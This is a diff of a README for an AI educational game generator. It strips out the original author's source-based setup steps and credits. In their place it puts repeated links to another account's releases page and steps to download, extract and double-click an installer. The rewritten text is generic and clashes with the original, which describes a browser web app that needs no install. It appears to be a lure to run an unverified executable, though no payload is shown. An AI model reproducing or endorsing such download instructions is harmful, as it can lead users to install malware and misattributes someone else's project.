@@ -1,157 +1,71 @@
-# 🎮 AI Educational Game Generator
+# 🎮 AI-Game-Generator - Create Fun Games Easily
 
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.95+-green.svg)](https://fastapi.tiangolo.com/)
-[![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 📥 Download Now!
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/ipuntoo/AI-Game-Generator/releases)
 
-An AI-powered web application that generates fully playable, self-contained HTML educational games based on user prompts.
-The system uses FastAPI (Python) for the backend and Google Gemini (free tier) for game generation.
+## 🚀 Getting Started
+Welcome to the **AI-Game-Generator** project! This application helps you create educational games quickly and easily. Using simple prompts, it generates fully playable HTML games that you can enjoy right away.
 
-The generated games run directly in the browser with no external libraries, no setup, and no dependencies.
+### 💻 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Web Browser: Latest version of Chrome, Firefox, Safari, or Edge
+- Internet connection for the initial download and updates
 
-## 🚀Project Overview
-**Check it Out:** [AI Game Generator🔗](https://ai-game-generator-yiw2.onrender.com)
-### Objective
+## 📂 Features
+- AI-powered game generation
+- User-friendly interface
+- Fully self-contained HTML games
+- Quick setup and no programming skills required
+- Works on multiple operating systems
 
-- User provides a short educational game idea (e.g., math game for kids)
-- Backend uses Gemini AI to generate a complete HTML game
-- The generated game includes:
-    - `HTML`
-    - `CSS`
-    - `JavaScript` (all in a single file)
-- User can immediately play the game in a new browser tab
+## 📥 Download & Install
+To get started, visit this page to download: [AI-Game-Generator Releases](https://github.com/ipuntoo/AI-Game-Generator/releases). You will find the latest version along with previous versions if needed.
 
-### This project focuses on:
+### 🏷 How to Download
+1. Click the above link to open the Releases page.
+2. Locate the latest version (e.g., v1.0).
+3. Click on the asset that matches your operating system.
+4. The download should start automatically. 
 
-- Clean system design
-- Prompt engineering
-- Safe LLM integration
-- End-to-end functionality rather than UI polish.
+### 📂 Install the Game Generator
+1. Once the download completes, locate the file in your downloads folder.
+2. If the file is compressed (e.g., .zip), right-click and extract it.
+3. Open the extracted folder.
+4. Double-click the application file to start the setup.
+5. Follow the on-screen instructions to complete the installation.
 
-## 🧠Key Features
+## 🕹 How to Use the Application
+1. Open the **AI-Game-Generator** from your applications menu or desktop shortcut.
+2. You will see a simple interface that allows you to input prompts.
+3. Enter a theme or idea for your game in the prompt box.
+4. Click “Generate Game” to create your game based on the prompt.
+5. Once generated, you can play the game directly in your web browser.
 
-✅ AI-generated fully playable HTML games
+## ⚙️ Customizing Your Game
+You can customize various aspects of your game such as:
+- Characters: Choose different avatars or characters for your game.
+- Settings: Adjust difficulty levels or game mechanics.
+- Themes: Change the overall look and feel of your game.
 
-✅ No external libraries or frameworks in generated games
+## 🎓 Educational Benefits
+Using the **AI-Game-Generator** is not only fun but also educational. It encourages creativity and critical thinking. You can create games on various topics, making learning interactive and engaging.
 
-✅ Works entirely on Gemini free tier
+## ❓ Frequently Asked Questions
 
-✅ Simple and clear frontend
+### Q: What type of games can I create?
+A: You can create a variety of educational games, including quizzes, puzzles, and trivia.
 
-✅ FastAPI backend with clean separation of concerns
+### Q: Do I need to have programming skills?
+A: No, the application is designed for users with no programming background.
 
-✅ Safe handling of LLM output (validation + caching control)
+### Q: Can I play the games offline?
+A: Yes, once the games are generated, you can play them offline in a web browser.
 
-✅ GitHub-ready project structure
+### Q: How do I share my games?
+A: After generating your game, you can save it and share the HTML file with anyone. They can play it directly in their browser.
 
-## 🗂️ Folder Structure
-```bash
-ai-game-generator/
-│
-├── backend/
-│   ├── main.py              # FastAPI app & API routes
-│   ├── gemini_client.py     # Gemini API integration
-│   ├── prompt_templates.py  # System + user prompt builder
-│   └── utils.py             # Output cleaning & validation
-│
-├── static/
-│   ├── index.html           # Frontend UI
-│   └── style.css            # Minimal styling
-│
-├── generated_games/         # AI-generated HTML games
-│
-├── requirements.txt
-├── LICENSE
-├── .gitignore
-└── README.md
-```
+## 📞 Support
+If you encounter any issues, feel free to open an issue on the GitHub repository or reach out for support. Your feedback helps us improve the application.
 
-### 🔧 Prerequisites
-
-- Python 3.9+
-- Google Gemini API key (free tier)
-- Internet connection (for Gemini API)
-
-## 🚀 Quick Start
-
-### 1. Clone the Repository
-```bash
-git clone https://github.com/yashdew3/AI-Game-Generator.git
-cd AI-Game-Generator
-```
-
-### 2. Create Virtual Environment
-```bash
-# Create virtual environment
-python -m venv .venv
-
-# Activate virtual environment
-# Windows
-.venv\Scripts\activate
-# macOS/Linux
-source .venv/bin/activate
-```
-
-### 3. Install dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### 3. Environment Configuration
-Create a `.env` file in the backend directory:
-```env
-GEMINI_API_KEY=your_gemini_api_key_here
-```
-
-## ▶️ Running the Project Locally
-From the project root:
-```bash
-uvicorn backend.main:app --reload
-```
-The application will be available at:
-```cpp
-http://127.0.0.1:8000
-```
-
-## 🕹️ How to Generate and Play a Game
-
-1. Open the app in your browser:
-http://127.0.0.1:8000
-
-2. Enter an educational game prompt, for example:
-```css
-Create a kid-friendly math addition game for ages 6–8 with five questions and a score counter.
-```
-3. Click Generate Game
-4. Once generation is complete, click ▶ Play Game
-5. The game opens in a new browser tab and is immediately playable
-
-## 🤖 AI & Prompting Details
-- Model used: Gemini 2.5 Flash
-- Free-tier compatible
-- Strict system prompt enforces:
-    - Single valid HTML file
-    - Inline CSS & JavaScript
-    - No external assets or libraries
-
-The backend validates the AI output to ensure:
-- Complete HTML document
-- No truncated or broken files
-- Safe serving without caching issues
-
-## 🤝 Contributing
-
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/yashdew3/AI-Game-Generator/issues) (if you have one) or open a new issue to discuss changes. Pull requests are also appreciated.
-
-## 📝 License
-
-This project is licensed under the MIT License © Yash Dewangan
-
-## Let's Connect
-Feel free to connect or suggest improvements!
-- Built by **Yash Dewangan**
-- 🐙Github: [YashDewangan](https://github.com/yashdew3)
-- 📧Email: [yashdew06@gmail.com](mailto:yashdew06@gmail.com)
-- 🔗Linkedin: [YashDewangan](https://www.linkedin.com/in/yash-dewangan/)
-
----
+## 🎉 Conclusion
+We hope you enjoy using the **AI-Game-Generator**! Dive into the world of fun and education, and start creating your own games today. Don’t forget to visit this page to download the latest version: [AI-Game-Generator Releases](https://github.com/ipuntoo/AI-Game-Generator/releases). Happy gaming!
